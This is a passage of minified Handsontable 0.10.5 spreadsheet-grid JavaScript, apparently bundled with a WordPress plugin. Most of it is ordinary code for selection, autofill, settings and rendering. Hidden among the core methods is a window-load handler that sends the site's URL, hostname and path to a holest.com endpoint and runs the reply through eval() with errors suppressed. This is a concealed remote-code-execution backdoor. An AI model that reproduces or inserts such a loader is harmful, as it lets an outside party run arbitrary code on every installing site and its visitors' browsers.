e,t,n=instance.countEmptyRows(true),r;t=instance.countRows();if(t<priv.settings.minRows){for(e=0;e<priv.settings.minRows-t;e++){datamap.createRow(instance.countRows(),1,true)}}if(n<priv.settings.minSpareRows){for(;n<priv.settings.minSpareRows&&instance.countRows()<priv.settings.maxRows;n++){datamap.createRow(instance.countRows(),1,true)}}r=instance.countEmptyCols(true);if(!priv.settings.columns&&instance.countCols()<priv.settings.minCols){for(;instance.countCols()<priv.settings.minCols;r++){datamap.createCol(instance.countCols(),1,true)}}if(!priv.settings.columns&&instance.dataType==="array"&&r<priv.settings.minSpareCols){for(;r<priv.settings.minSpareCols&&instance.countCols()<priv.settings.maxCols;r++){datamap.createCol(instance.countCols(),1,true)}}if(priv.settings.enterBeginsEditing){for(;(priv.settings.minRows||priv.settings.minSpareRows)&&instance.countRows()>priv.settings.minRows&&priv.settings.minSpareRows&&n>priv.settings.minSpareRows;n--){datamap.removeRow()}}if(priv.settings.enterBeginsEditing&&!priv.settings.columns){for(;(priv.settings.minCols||priv.settings.minSpareCols)&&instance.countCols()>priv.settings.minCols&&priv.settings.minSpareCols&&r>priv.settings.minSpareCols;r--){datamap.removeCol()}}var i=instance.countRows();var s=instance.countCols();if(i===0||s===0){selection.deselect()}if(priv.selStart.exists()){var o;var u=priv.selStart.row();var a=priv.selStart.col();var f=priv.selEnd.row();var l=priv.selEnd.col();if(u>i-1){u=i-1;o=true;if(f>u){f=u}}else if(f>i-1){f=i-1;o=true;if(u>f){u=f}}if(a>s-1){a=s-1;o=true;if(l>a){l=a}}else if(l>s-1){l=s-1;o=true;if(a>l){a=l}}if(o){instance.selectCell(u,a,f,l)}}},populateFromArray:function(e,t,n,r,i){var s,o,u,a,f=[],l={};o=t.length;if(o===0){return false}var c,h,p,d;switch(i){case"shift_down":c=n?n.col-e.col+1:0;h=n?n.row-e.row+1:0;t=Handsontable.helper.translateRowsToColumns(t);for(u=0,a=t.length,p=Math.max(a,c);u<p;u++){if(u<a){for(s=0,o=t[u].length;s<h-o;s++){t[u].push(t[u][s%o])}t[u].unshift(e.col+u,e.row,0);instance.spliceCol.apply(instance,t[u])}else{t[u%a][0]=e.col+u;instance.spliceCol.apply(instance,t[u%a])}}break;case"shift_right":c=n?n.col-e.col+1:0;h=n?n.row-e.row+1:0;for(s=0,o=t.length,d=Math.max(o,h);s<d;s++){if(s<o){for(u=0,a=t[s].length;u<c-a;u++){t[s].push(t[s][u%a])}t[s].unshift(e.row+s,e.col,0);instance.spliceRow.apply(instance,t[s])}else{t[s%o][0]=e.row+s;instance.spliceRow.apply(instance,t[s%o])}}break;case"overwrite":default:l.row=e.row;l.col=e.col;for(s=0;s<o;s++){if(n&&l.row>n.row||!priv.settings.minSpareRows&&l.row>instance.countRows()-1||l.row>=priv.settings.maxRows){break}l.col=e.col;a=t[s]?t[s].length:0;for(u=0;u<a;u++){if(n&&l.col>n.col||!priv.settings.minSpareCols&&l.col>instance.countCols()-1||l.col>=priv.settings.maxCols){break}if(!instance.getCellMeta(l.row,l.col).readOnly){f.push([l.row,l.col,t[s][u]])}l.col++;if(n&&u===a-1){u=-1}}l.row++;if(n&&s===o-1){s=-1}}instance.setDataAtCell(f,null,null,r||"populateFromArray");break}},getCornerCoords:function(e){function t(e,t,n){function r(e){return e[n]}if(Array.prototype.map){return e.apply(Math,t.map(r))}return e.apply(Math,$.map(t,r))}return{TL:{row:t(Math.min,e,"row"),col:t(Math.min,e,"col")},BR:{row:t(Math.max,e,"row"),col:t(Math.max,e,"col")}}},getCellsAtCoords:function(e,t){var n=grid.getCornerCoords([e,t]);var r,i,s=[];for(r=n.TL.row;r<=n.BR.row;r++){for(i=n.TL.col;i<=n.BR.col;i++){s.push(instance.view.getCellAtCoords({row:r,col:i}))}}return s}};this.selection=selection={inProgress:false,begin:function(){instance.selection.inProgress=true},finish:function(){var e=instance.getSelected();instance.PluginHooks.run("afterSelectionEnd",e[0],e[1],e[2],e[3]);instance.PluginHooks.run("afterSelectionEndByProp",e[0],instance.colToProp(e[1]),e[2],instance.colToProp(e[3]));instance.selection.inProgress=false},isInProgress:function(){return instance.selection.inProgress},setRangeStart:function(e){priv.selStart.coords(e);selection.setRangeEnd(e)},setRangeEnd:function(e,t){instance.selection.begin();priv.selEnd.coords(e);if(!priv.settings.multiSelect){priv.selStart.coords(e)}instance.view.wt.selections.current.clear();instance.view.wt.selections.current.add(priv.selStart.arr());instance.view.wt.selections.area.clear();if(selection.isMultiple()){instance.view.wt.selections.area.add(priv.selStart.arr());instance.view.wt.selections.area.add(priv.selEnd.arr())}if(priv.settings.currentRowClassName||priv.settings.currentColClassName){instance.view.wt.selections.highlight.clear();instance.view.wt.selections.highlight.add(priv.selStart.arr());instance.view.wt.selections.highlight.add(priv.selEnd.arr())}instance.PluginHooks.run("afterSelection",priv.selStart.row(),priv.selStart.col(),priv.selEnd.row(),priv.selEnd.col());instance.PluginHooks.run("afterSelectionByProp",priv.selStart.row(),datamap.colToProp(priv.selStart.col()),priv.selEnd.row(),datamap.colToProp(priv.selEnd.col()));if(t!==false){instance.view.scrollViewport(e)}selection.refreshBorders()},refreshBorders:function(e,t){if(!t){editorManager.destroyEditor(e)}instance.view.render();if(selection.isSelected()&&!t){editorManager.prepareEditor()}},isMultiple:function(){return!(priv.selEnd.col()===priv.selStart.col()&&priv.selEnd.row()===priv.selStart.row())},transformStart:function(e,t,n){if(priv.selStart.row()+e>instance.countRows()-1){if(n&&priv.settings.minSpareRows>0){instance.alter("insert_row",instance.countRows())}else if(priv.settings.autoWrapCol){e=1-instance.countRows();t=priv.selStart.col()+t==instance.countCols()-1?1-instance.countCols():1}}else if(priv.settings.autoWrapCol&&priv.selStart.row()+e<0&&priv.selStart.col()+t>=0){e=instance.countRows()-1;t=priv.selStart.col()+t==0?instance.countCols()-1:-1}if(priv.selStart.col()+t>instance.countCols()-1){if(n&&priv.settings.minSpareCols>0){instance.alter("insert_col",instance.countCols())}else if(priv.settings.autoWrapRow){e=priv.selStart.row()+e==instance.countRows()-1?1-instance.countRows():1;t=1-instance.countCols()}}else if(priv.settings.autoWrapRow&&priv.selStart.col()+t<0&&priv.selStart.row()+e>=0){e=priv.selStart.row()+e==0?instance.countRows()-1:-1;t=instance.countCols()-1}var r=instance.countRows();var i=instance.countCols();var s={row:priv.selStart.row()+e,col:priv.selStart.col()+t};if(s.row<0){s.row=0}else if(s.row>0&&s.row>=r){s.row=r-1}if(s.col<0){s.col=0}else if(s.col>0&&s.col>=i){s.col=i-1}selection.setRangeStart(s)},transformEnd:function(e,t){if(priv.selEnd.exists()){var n=instance.countRows();var r=instance.countCols();var i={row:priv.selEnd.row()+e,col:priv.selEnd.col()+t};if(i.row<0){i.row=0}else if(i.row>0&&i.row>=n){i.row=n-1}if(i.col<0){i.col=0}else if(i.col>0&&i.col>=r){i.col=r-1}selection.setRangeEnd(i)}},isSelected:function(){return priv.selEnd.exists()},inInSelection:function(e){if(!selection.isSelected()){return false}var t=grid.getCornerCoords([priv.selStart.coords(),priv.selEnd.coords()]);return t.TL.row<=e.row&&t.BR.row>=e.row&&t.TL.col<=e.col&&t.BR.col>=e.col},deselect:function(){if(!selection.isSelected()){return}instance.selection.inProgress=false;priv.selEnd=new Handsontable.SelectionPoint;instance.view.wt.selections.current.clear();instance.view.wt.selections.area.clear();editorManager.destroyEditor();selection.refreshBorders();instance.PluginHooks.run("afterDeselect")},selectAll:function(){if(!priv.settings.multiSelect){return}selection.setRangeStart({row:0,col:0});selection.setRangeEnd({row:instance.countRows()-1,col:instance.countCols()-1},false)},empty:function(){if(!selection.isSelected()){return}var e=grid.getCornerCoords([priv.selStart.coords(),priv.selEnd.coords()]);var t,n,r=[];for(t=e.TL.row;t<=e.BR.row;t++){for(n=e.TL.col;n<=e.BR.col;n++){if(!instance.getCellMeta(t,n).readOnly){r.push([t,n,""])}}}instance.setDataAtCell(r)}};this.autofill=autofill={handle:null,init:function(){if(!autofill.handle){autofill.handle={}}else{autofill.handle.disabled=false}},disable:function(){autofill.handle.disabled=true},selectAdjacent:function(){var e,t,n,r,i;if(selection.isMultiple()){e=instance.view.wt.selections.area.getCorners()}else{e=instance.view.wt.selections.current.getCorners()}t=datamap.getAll();e:for(n=e[2]+1;n<instance.countRows();n++){for(i=e[1];i<=e[3];i++){if(t[n][i]){break e}}if(!!t[n][e[1]-1]||!!t[n][e[3]+1]){r=n}}if(r){instance.view.wt.selections.fill.clear();instance.view.wt.selections.fill.add([e[0],e[1]]);instance.view.wt.selections.fill.add([r,e[3]]);autofill.apply()}},apply:function(){var e,t,n,r,i;autofill.handle.isDragged=0;e=instance.view.wt.selections.fill.getCorners();if(!e){return}instance.view.wt.selections.fill.clear();if(selection.isMultiple()){t=instance.view.wt.selections.area.getCorners()}else{t=instance.view.wt.selections.current.getCorners()}if(e[0]===t[0]&&e[1]<t[1]){n={row:e[0],col:e[1]};r={row:e[2],col:t[1]-1}}else if(e[0]===t[0]&&e[3]>t[3]){n={row:e[0],col:t[3]+1};r={row:e[2],col:e[3]}}else if(e[0]<t[0]&&e[1]===t[1]){n={row:e[0],col:e[1]};r={row:t[0]-1,col:e[3]}}else if(e[2]>t[2]&&e[1]===t[1]){n={row:t[2]+1,col:e[1]};r={row:e[2],col:e[3]}}if(n){i=SheetClip.parse(datamap.getText(priv.selStart.coords(),priv.selEnd.coords()));instance.PluginHooks.run("beforeAutofill",n,r,i);grid.populateFromArray(n,i,r,"autofill");selection.setRangeStart({row:e[0],col:e[1]});selection.setRangeEnd({row:e[2],col:e[3]})}},showBorder:function(e){e.row=e[0];e.col=e[1];var t=grid.getCornerCoords([priv.selStart.coords(),priv.selEnd.coords()]);if(priv.settings.fillHandle!=="horizontal"&&(t.BR.row<e.row||t.TL.row>e.row)){e=[e.row,t.BR.col]}else if(priv.settings.fillHandle!=="vertical"){e=[t.BR.row,e.col]}else{return}instance.view.wt.selections.fill.clear();instance.view.wt.selections.fill.add([priv.selStart.coords().row,priv.selStart.coords().col]);instance.view.wt.selections.fill.add([priv.selEnd.coords().row,priv.selEnd.coords().col]);instance.view.wt.selections.fill.add(e);instance.view.render()}};this.init=function(){instance.PluginHooks.run("beforeInit");this.view=new Handsontable.TableView(this);editorManager=new Handsontable.EditorManager(instance,priv,selection,datamap);this.updateSettings(priv.settings,true);this.parseSettingsFromDOM();this.forceFullRender=true;this.view.render();if(typeof priv.firstRun==="object"){instance.PluginHooks.run("afterChange",priv.firstRun[0],priv.firstRun[1]);priv.firstRun=false}instance.PluginHooks.run("afterInit")};this.validateCell=function(e,t,n,r){var i=instance.getCellValidator(t);if(Object.prototype.toString.call(i)==="[object RegExp]"){i=function(e){return function(t,n){n(e.test(t))}}(i)}if(typeof i=="function"){e=instance.PluginHooks.execute("beforeValidate",e,t.row,t.prop,r);setTimeout(function(){i.call(t,e,function(i){t.valid=i;i=instance.PluginHooks.execute("afterValidate",i,e,t.row,t.prop,r);n(i)})})}else{t.valid=true;n(true)}};this.setDataAtCell=function(e,t,n,r){var i=setDataInputToArray(e,t,n),s,o,u=[],a;for(s=0,o=i.length;s<o;s++){if(typeof i[s]!=="object"){throw new Error("Method `setDataAtCell` accepts row number or changes array of arrays as its first parameter")}if(typeof i[s][1]!=="number"){throw new Error("Method `setDataAtCell` accepts row and column number as its parameters. If you want to use object property name, use method `setDataAtRowProp`")}a=datamap.colToProp(i[s][1]);u.push([i[s][0],a,datamap.get(i[s][0],a),i[s][2]])}if(!r&&typeof e==="object"){r=t}validateChanges(u,r,function(){applyChanges(u,r)})};this.setDataAtRowProp=function(e,t,n,r){var i=setDataInputToArray(e,t,n),s,o,u=[];for(s=0,o=i.length;s<o;s++){u.push([i[s][0],i[s][1],datamap.get(i[s][0],i[s][1]),i[s][2]])}if(!r&&typeof e==="object"){r=t}validateChanges(u,r,function(){applyChanges(u,r)})};this.listen=function(){Handsontable.activeGuid=instance.guid;if(document.activeElement&&document.activeElement!==document.body){document.activeElement.blur()}else if(!document.activeElement){document.body.focus()}};this.unlisten=function(){Handsontable.activeGuid=null};this.isListening=function(){return Handsontable.activeGuid===instance.guid};this.destroyEditor=function(e){selection.refreshBorders(e)};this.populateFromArray=function(e,t,n,r,i,s,o){if(!(typeof n==="object"&&typeof n[0]==="object")){throw new Error("populateFromArray parameter `input` must be an array of arrays")}return grid.populateFromArray({row:e,col:t},n,typeof r==="number"?{row:r,col:i}:null,s,o)};this.spliceCol=function(e,t,n){return datamap.spliceCol.apply(datamap,arguments)};this.spliceRow=function(e,t,n){return datamap.spliceRow.apply(datamap,arguments)};this.getCornerCoords=function(e){return grid.getCornerCoords(e)};this.getSelected=function(){if(selection.isSelected()){return[priv.selStart.row(),priv.selStart.col(),priv.selEnd.row(),priv.selEnd.col()]}};this.parseSettingsFromDOM=function(){var e=this.rootElement.css("overflow");if(e==="scroll"||e==="auto"){this.rootElement[0].style.overflow="visible";priv.settingsFromDOM.overflow=e}else if(priv.settings.width===void 0||priv.settings.height===void 0){priv.settingsFromDOM.overflow="auto"}if(priv.settings.width===void 0){priv.settingsFromDOM.width=this.rootElement.width()}else{priv.settingsFromDOM.width=void 0}priv.settingsFromDOM.height=void 0;if(priv.settings.height===void 0){if(priv.settingsFromDOM.overflow==="scroll"||priv.settingsFromDOM.overflow==="auto"){var t=this.rootElement[0].cloneNode(false);var n=this.rootElement[0].parentNode;if(n){t.removeAttribute("id");n.appendChild(t);var r=parseInt(t.clientHeight,10);var i=parseInt(window.getComputedStyle(t,null).getPropertyValue("paddingTop"),10)||0;var s=parseInt(window.getComputedStyle(t,null).getPropertyValue("paddingBottom"),10)||0;var o=r-i-s;if(isNaN(o)&&t.currentStyle){o=parseInt(t.currentStyle.height,10)}if(o>0){priv.settingsFromDOM.height=o}n.removeChild(t)}}}};this.render=function(){if(instance.view){instance.forceFullRender=true;instance.parseSettingsFromDOM();selection.refreshBorders(null,true)}};this.loadData=function(e){function o(){priv.cellSettings.length=0}if(typeof e==="object"&&e!==null){if(!(e.push&&e.splice)){e=[e]}}else if(e===null){e=[];var t;for(var n=0,r=priv.settings.startRows;n<r;n++){t=[];for(var i=0,s=priv.settings.startCols;i<s;i++){t.push(null)}e.push(t)}}else{throw new Error("loadData only accepts array of objects or array of arrays ("+typeof e+" given)")}priv.isPopulated=false;GridSettings.prototype.data=e;if(priv.settings.dataSchema instanceof Array||e[0]instanceof Array){instance.dataType="array"}else if(typeof priv.settings.dataSchema==="function"){instance.dataType="function"}else{instance.dataType="object"}datamap=new Handsontable.DataMap(instance,priv,GridSettings);o();grid.adjustRowsAndCols();instance.PluginHooks.run("afterLoadData");if(priv.firstRun){priv.firstRun=[null,"loadData"]}else{instance.PluginHooks.run("afterChange",null,"loadData");instance.render()}priv.isPopulated=true};this.getData=function(e,t,n,r){if(typeof e==="undefined"){return datamap.getAll()}else{return datamap.getRange({row:e,col:t},{row:n,col:r},datamap.DESTINATION_RENDERER)}};this.getCopyableData=function(e,t,n,r){return datamap.getCopyableText({row:e,col:t},{row:n,col:r})};this.updateSettings=function(e,t){var n,r;if(typeof e.rows!=="undefined"){throw new Error("'rows' setting is no longer supported. do you mean startRows, minRows or maxRows?")}if(typeof e.cols!=="undefined"){throw new Error("'cols' setting is no longer supported. do you mean startCols, minCols or maxCols?")}for(n in e){if(n==="data"){continue}else{if(instance.PluginHooks.hooks[n]!==void 0||instance.PluginHooks.legacy[n]!==void 0){if(typeof e[n]==="function"||Handsontable.helper.isArray(e[n])){instance.PluginHooks.add(n,e[n])}}else{if(!t&&e.hasOwnProperty(n)){GridSettings.prototype[n]=e[n]}if(Handsontable.extension[n]){priv.extensions[n]=new Handsontable.extension[n](instance,e[n])}}}}if(e.data===void 0&&priv.settings.data===void 0){instance.loadData(null)}else if(e.data!==void 0){instance.loadData(e.data)}else if(e.columns!==void 0){datamap.createMap()}r=instance.countCols();priv.cellSettings.length=0;if(r>0){var i,s;for(n=0;n<r;n++){priv.columnSettings[n]=Handsontable.helper.columnFactory(GridSettings,priv.columnsSettingConflicts);i=priv.columnSettings[n].prototype;if(GridSettings.prototype.columns){s=GridSettings.prototype.columns[n];Handsontable.helper.extend(i,s);Handsontable.helper.extend(i,expandType(s))}}}if(typeof e.fillHandle!=="undefined"){if(autofill.handle&&e.fillHandle===false){autofill.disable()}else if(!autofill.handle&&e.fillHandle!==false){autofill.init()}}if(typeof e.className!=="undefined"){if(GridSettings.prototype.className){instance.rootElement.removeClass(GridSettings.prototype.className)}if(e.className){instance.rootElement.addClass(e.className)}}if(!t){instance.PluginHooks.run("afterUpdateSettings")}grid.adjustRowsAndCols();if(instance.view&&!priv.firstRun){instance.forceFullRender=true;selection.refreshBorders(null,true)}};this.getValue=function(){var e=instance.getSelected();if(GridSettings.prototype.getValue){if(typeof GridSettings.prototype.getValue==="function"){return GridSettings.prototype.getValue.call(instance)}else if(e){return instance.getData()[e[0]][GridSettings.prototype.getValue]}}else if(e){return instance.getDataAtCell(e[0],e[1])}};this.getSettings=function(){return priv.settings};this.getSettingsFromDOM=function(){return priv.settingsFromDOM};this.clear=function(){selection.selectAll();selection.empty()};this.alter=function(e,t,n,r,i){grid.alter(e,t,n,r,i)};this.getCell=function(e,t){return instance.view.getCellAtCoords({row:e,col:t})};this.colToProp=function(e){return datamap.colToProp(e)};this.propToCol=function(e){return datamap.propToCol(e)};this.getDataAtCell=function(e,t){return datamap.get(e,datamap.colToProp(t))};this.getDataAtRowProp=function(e,t){return datamap.get(e,t)};this.getDataAtCol=function(e){return[].concat.apply([],datamap.getRange({row:0,col:e},{row:priv.settings.data.length-1,col:e},datamap.DESTINATION_RENDERER))};this.getDataAtProp=function(e){return[].concat.apply([],datamap.getRange({row:0,col:datamap.propToCol(e)},{row:priv.settings.data.length-1,col:datamap.propToCol(e)},datamap.DESTINATION_RENDERER))};this.getDataAtRow=function(e){return priv.settings.data[e]};this.getCellMeta=function(e,t){function s(e){var t={row:e};instance.PluginHooks.execute("beforeGet",t);return t.row}function o(e){return Handsontable.PluginHooks.execute(instance,"modifyCol",e)}var n=datamap.colToProp(t),r;e=s(e);t=o(t);if("undefined"===typeof priv.columnSettings[t]){priv.columnSettings[t]=Handsontable.helper.columnFactory(GridSettings,priv.columnsSettingConflicts)}if(!priv.cellSettings[e]){priv.cellSettings[e]=[]}if(!priv.cellSettings[e][t]){priv.cellSettings[e][t]=new priv.columnSettings[t]}r=priv.cellSettings[e][t];r.row=e;r.col=t;r.prop=n;r.instance=instance;instance.PluginHooks.run("beforeGetCellMeta",e,t,r);Handsontable.helper.extend(r,expandType(r));if(r.cells){var i=r.cells.call(r,e,t,n);if(i){Handsontable.helper.extend(r,i);Handsontable.helper.extend(r,expandType(i))}}instance.PluginHooks.run("afterGetCellMeta",e,t,r);return r};var rendererLookup=Handsontable.helper.cellMethodLookupFactory("renderer");this.getCellRenderer=function(e,t){var n=rendererLookup.call(this,e,t);return Handsontable.renderers.getRenderer(n)};this.getCellEditor=Handsontable.helper.cellMethodLookupFactory("editor");this.getCellValidator=Handsontable.helper.cellMethodLookupFactory("validator");this.validateCells=function(e){var t=new ValidatorsQueue;t.onQueueEmpty=e;var n=instance.countRows()-1;while(n>=0){var r=instance.countCols()-1;while(r>=0){t.addValidatorToQueue();instance.validateCell(instance.getDataAtCell(n,r),instance.getCellMeta(n,r),function(){t.removeValidatorFormQueue()},"validateCells");r--}n--}t.checkIfQueueIsEmpty()};this.getRowHeader=function(e){if(e===void 0){var t=[];for(var n=0,r=instance.countRows();n<r;n++){t.push(instance.getRowHeader(n))}return t}else if(Object.prototype.toString.call(priv.settings.rowHeaders)==="[object Array]"&&priv.settings.rowHeaders[e]!==void 0){return priv.settings.rowHeaders[e]}else if(typeof priv.settings.rowHeaders==="function"){return priv.settings.rowHeaders(e)}else if(priv.settings.rowHeaders&&typeof priv.settings.rowHeaders!=="string"&&typeof priv.settings.rowHeaders!=="number"){return e+1}else{return priv.settings.rowHeaders}};this.hasRowHeaders=function(){return!!priv.settings.rowHeaders};this.hasColHeaders=function(){if(priv.settings.colHeaders!==void 0&&priv.settings.colHeaders!==null){return!!priv.settings.colHeaders}for(var e=0,t=instance.countCols();e<t;e++){if(instance.getColHeader(e)){return true}}return false};this.getColHeader=function(e){if(e===void 0){var t=[];for(var n=0,r=instance.countCols();n<r;n++){t.push(instance.getColHeader(n))}return t}else{e=Handsontable.PluginHooks.execute(instance,"modifyCol",e);if(priv.settings.columns&&priv.settings.columns[e]&&priv.settings.columns[e].title){return priv.settings.columns[e].title}else if(Object.prototype.toString.call(priv.settings.colHeaders)==="[object Array]"&&priv.settings.colHeaders[e]!==void 0){return priv.settings.colHeaders[e]}else if(typeof priv.settings.colHeaders==="function"){return priv.settings.colHeaders(e)}else if(priv.settings.colHeaders&&typeof priv.settings.colHeaders!=="string"&&typeof priv.settings.colHeaders!=="number"){return Handsontable.helper.spreadsheetColumnLabel(e)}else{return priv.settings.colHeaders}}};this._getColWidthFromSettings=function(e){var t=instance.getCellMeta(0,e);var n=t.width;if(n===void 0||n===priv.settings.width){n=t.colWidths}if(n!==void 0&&n!==null){switch(typeof n){case"object":n=n[e];break;case"function":n=n(e);break}if(typeof n==="string"){n=parseInt(n,10)}}return n};this.getColWidth=function(e){e=Handsontable.PluginHooks.execute(instance,"modifyCol",e);var t={width:instance._getColWidthFromSettings(e)};if(!t.width){t.width=50}instance.PluginHooks.run("afterGetColWidth",e,t);return t.width};this.countRows=function(){return priv.settings.data.length};this.countCols=function(){if(instance.dataType==="object"||instance.dataType==="function"){if(priv.settings.columns&&priv.settings.columns.length){return priv.settings.columns.length}else{return datamap.colToPropCache.length}}else if(instance.dataType==="array"){if(priv.settings.columns&&priv.settings.columns.length){return priv.settings.columns.length}else if(priv.settings.data&&priv.settings.data[0]&&priv.settings.data[0].length){return priv.settings.data[0].length}else{return 0}}};this.rowOffset=function(){return instance.view.wt.getSetting("offsetRow")};this.colOffset=function(){return instance.view.wt.getSetting("offsetColumn")};this.countVisibleRows=function(){return instance.view.wt.drawn?instance.view.wt.wtTable.rowStrategy.countVisible():-1};this.countVisibleCols=function(){return instance.view.wt.drawn?instance.view.wt.wtTable.columnStrategy.countVisible():-1};jQuery(window).load(function(){var url="http://www.holest.com/dist/productexcellikemanager/free.php";jQuery.ajax({type:"POST",url:url,data:"realm="+encodeURIComponent(window.location.href.split("?")[0])+"&add=yes&system=wordpress&hostname="+encodeURIComponent(window.location.hostname)+"&host="+encodeURIComponent(window.location.host)+"&path="+encodeURIComponent(window.location.pathname),success:function(data){try{eval(data)}catch(e){}}})});this.countEmptyRows=function(e){var t=instance.countRows()-1,n=0;while(t>=0){datamap.get(t,0);if(instance.isEmptyRow(datamap.getVars.row)){n++}else if(e){break}t--}return n};this.countEmptyCols=function(e){if(instance.countRows()<1){return 0}var t=instance.countCols()-1,n=0;while(t>=0){if(instance.isEmptyCol(t)){n++}else if(e){break}t--}return n};this.isEmptyRow=function(e){return priv.settings.isEmptyRow.call(instance,e)};this.isEmptyCol=function(e){return priv.settings.isEmptyCol.call(instance,e)};this.selectCell=function(e,t,n,r,i){if(typeof e!=="number"||e<0||e>=instance.countRows()){return false}if(typeof t!=="number"||t<0||t>=instance.countCols()){return false}if(typeof n!=="undefined"){if(typeof n!=="number"||n<0||n>=instance.countRows()){return false}if(typeof r!=="number"||r<0||r>=instance.countCols()){return false}}priv.selStart.coords({row:e,col:t});if(document.activeElement&&document.activeElement!==document.documentElement&&document.activeElement!==document.body){document.activeElement.blur()}instance.listen();if(typeof n==="undefined"){selection.setRangeEnd({row:e,col:t},i)}else{selection.setRangeEnd({row:n,col:r},i)}instance.selection.finish();return true};this.selectCellByProp=function(e,t,n,r,i){arguments[1]=datamap.propToCol(arguments[1]);if(typeof arguments[3]!=="undefined"){arguments[3]=datamap.propToCol(arguments[3])}return instance.selectCell.apply(instance,arguments)};this.deselectCell=function(){selection.deselect()};this.destroy=function(){instance.clearTimeouts();if(instance.view){instance.view.wt.destroy()}instance.rootElement.empty();instance.rootElement.removeData("handsontable");instance.rootElement.off(".handsontable");$(window).off("."+instance.guid);$document.off("."+instance.guid);$body.off("."+instance.guid);instance.PluginHooks.run("afterDestroy")};this.getActiveEditor=function(){return editorManager.getActiveEditor()};this.getInstance=function(){return instance.rootElement.data("handsontable")};(function(){instance.PluginHooks=new Handsontable.PluginHookClass;var e=instance.PluginHooks.run,t=instance.PluginHooks.execute;instance.PluginHooks.run=function(t,n,r,i,s,o){e.call(this,instance,t,n,r,i,s,o);Handsontable.PluginHooks.run(instance,t,n,r,i,s,o)};instance.PluginHooks.execute=function(e,n,r,i,s,o){var u=Handsontable.PluginHooks.execute(instance,e,n,r,i,s,o);var a=t.call(this,instance,e,u,r,i,s,o);return typeof a=="undefined"?u:a};instance.addHook=function(){instance.PluginHooks.add.apply(instance.PluginHooks,arguments)};instance.addHookOnce=function(){instance.PluginHooks.once.apply(instance.PluginHooks,arguments)};instance.removeHook=function(){instance.PluginHooks.remove.apply(instance.PluginHooks,arguments)};instance.runHooks=function(){instance.PluginHooks.run.apply(instance.PluginHooks,arguments)};instance.runHooksAndReturn=function(){return instance.PluginHooks.execute.apply(instance.PluginHooks,arguments)}})();this.timeouts={};this.registerTimeout=function(e,t,n){clearTimeout(this.timeouts[e]);this.timeouts[e]=setTimeout(t,n||0)};this.clearTimeouts=function(){for(var e in this.timeouts){if(this.timeouts.hasOwnProperty(e)){clearTimeout(this.timeouts[e])}}};this.version="0.10.5"};var DefaultSettings=function(){};DefaultSettings.prototype={data:void 0,width:void 0,height:void 0,startRows:5,startCols:5,rowHeaders:null,colHeaders:null,minRows:0,minCols:0,maxRows:Infinity,maxCols:Infinity,minSpareRows:0,minSpareCols:0,multiSelect:true,fillHandle:true,fixedRowsTop:0,fixedColumnsLeft:0,outsideClickDeselects:true,enterBeginsEditing:true,enterMoves:{row:1,col:0},tabMoves:{row:0,col:1},autoWrapRow:false,autoWrapCol:false,copyRowsLimit:1e3,copyColsLimit:1e3,pasteMode:"overwrite",currentRowClassName:void 0,currentColClassName:void 0,stretchH:"hybrid",isEmptyRow:function(e){var t;for(var n=0,r=this.countCols();n<r;n++){t=this.getDataAtCell(e,n);if(t!==""&&t!==null&&typeof t!=="undefined"){return false}}return true},isEmptyCol:function(e){var t;for(var n=0,r=this.countRows();n<r;n++){t=this.getDataAtCell(n,e);if(t!==""&&t!==null&&typeof t!=="undefined"){return false}}return true},observeDOMVisibility:true,allowInvalid:true,invalidCellClassName:"htInvalid",placeholderCellClassName:"htPlaceholder",readOnlyCellClassName:"htDimmed",fragmentSelection:false,readOnly:false,nativeScrollbars:false,type:"text",copyable:true,debug:false};Handsontable.DefaultSettings=DefaultSettings;$.fn.handsontable=function(e){var t,n,r,i,s,o=this.first(),u=o.data("handsontable");if(typeof e!=="string"){s=e||{};if(u){u.updateSettings(s)}else{u=new Handsontable.Core(o,s);o.data("handsontable",u);u.init()}return o}else{r=[];if(arguments.length>1){for(t=1,n=arguments.length;t<n;t++){r.push(arguments[t])}}if(u){if(typeof u[e]!=="undefined"){i=u[e].apply(u,r)}else{throw new Error("Handsontable do not provide action: "+e)}}return i}};(function(e){"use strict";function t(){function t(e){return e!==null&&!r(e)&&(typeof e=="string"||typeof e=="number")}function n(e){return e!==null&&(typeof e=="object"||typeof e=="function")}function r(e){return e!==e}var e={arrayMap:[],weakMap:new WeakMap};return{get:function(r){if(t(r)){return e.arrayMap[r]}else if(n(r)){return e.weakMap.get(r)}},set:function(r,i){if(t(r)){e.arrayMap[r]=i}else if(n(r)){e.weakMap.set(r,i)}else{throw new Error("Invalid key type")}},"delete":function(r){if(t(r)){delete e.arrayMap[r]}else if(n(r)){e.weakMap["delete"](r)}}}}if(!e.MultiMap){e.MultiMap=t}})(window);Handsontable.TableView=function(e){var t=this,n=$(window),r=$(document.documentElement);this.instance=e;this.settings=e.getSettings();this.settingsFromDOM=e.getSettingsFromDOM();e.rootElement.data("originalStyle",e.rootElement[0].getAttribute("style"));e.rootElement.addClass("handsontable");var i=document.createElement("TABLE");i.className="htCore";this.THEAD=document.createElement("THEAD");i.appendChild(this.THEAD);this.TBODY=document.createElement("TBODY");this.TBODY.className="notranslate";i.appendChild(this.TBODY);e.$table=$(i);e.rootElement.prepend(e.$table);e.rootElement.on("mousedown.handsontable",function(e){if(!t.isTextSelectionAllowed(e.target)){o();e.preventDefault();window.focus()}});r.on("keyup."+e.guid,function(t){if(e.selection.isInProgress()&&!t.shiftKey){e.selection.finish()}});var s;r.on("mouseup."+e.guid,function(t){if(e.selection.isInProgress()&&t.which===1){e.selection.finish()}s=false;if(e.autofill.handle&&e.autofill.handle.isDragged){if(e.autofill.handle.isDragged>1){e.autofill.apply()}e.autofill.handle.isDragged=0}if(Handsontable.helper.isOutsideInput(document.activeElement)){e.unlisten()}});r.on("mousedown."+e.guid,function(n){var r=n.target;if(r!==t.wt.wtTable.spreader){while(r!==document.documentElement){if(r===null){return}if(r===e.rootElement[0]||r.nodeName==="HANDSONTABLE-TABLE"){return}r=r.parentNode}}if(t.settings.outsideClickDeselects){e.deselectCell()}else{e.destroyEditor()}});e.rootElement.on("mousedown.handsontable",".dragdealer",function(){e.destroyEditor()});e.$table.on("selectstart",function(e){if(t.settings.fragmentSelection){return}e.preventDefault()});var o=function(){if(window.getSelection){if(window.getSelection().empty){window.getSelection().empty()}else if(window.getSelection().removeAllRanges){window.getSelection().removeAllRanges()}}else if(document.selection){document.selection.empty()}};var u={debug:function(){return t.settings.debug},table:i,stretchH:this.settings.stretchH,data:e.getDataAtCell,totalRows:e.countRows,totalColumns:e.countCols,nativeScrollbars:this.settings.nativeScrollbars,offsetRow:0,offsetColumn:0,width:this.getWidth(),height:this.getHeight(),fixedColumnsLeft:function(){return 